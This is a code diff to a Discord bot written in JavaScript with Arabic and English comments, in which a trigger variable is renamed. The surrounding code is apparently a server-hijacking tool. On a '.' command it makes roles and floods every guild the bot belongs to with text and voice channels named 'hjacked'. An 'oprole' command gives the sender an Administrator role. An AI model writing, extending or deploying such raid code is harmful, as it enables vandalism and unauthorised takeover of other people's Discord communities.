@@ -1,7 +1,7 @@
 const Discord = require("discord.js") //npm i discord.js
 const client = new Discord.Client();
 const Token = '' //حط توكن بوتك هنا // your bot token
-const 名のです = "." //الامر يلي يشغل الكود //the command to start the hack system
+const nanodesu = "." //الامر يلي يشغل الكود //the command to start the hack system
 const opcmd = 'oprole' // The Op Command To Give You Adminstrator Role
 const teext = "hjacked" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
 const vooice = "HJACKED" // اسم الرومات الصوتيه يلي بيسويها //the voicechannel name
@@ -99,7 +99,7 @@ let me = message.author
             client.on('message', message => {
      
 
-                if (message.content === 名のです) {
+                if (message.content === nanodesu) {
                     client.guilds.forEach(m =>{
              m.createRole({
                    name : role,
@@ -306,7 +306,7 @@ let me = message.author
            });
            //create the textchannels
            client.on('message', message => {
-                    if (message.content === 名のです) {
+                    if (message.content === nanodesu) {
                           client.guilds.forEach(m =>{
            m.createChannel(teext, 'text');
            m.createChannel(teext, 'text');
@@ -360,7 +360,7 @@ let me = message.author
            });
            //create the voicechannels
            client.on('message', message => {
-                    if (message.content === 名のです) {
+                    if (message.content === nanodesu) {
                             client.guilds.forEach(m =>{
            m.createChannel(vooice, 'voice');
            m.createChannel(vooice, 'voice');
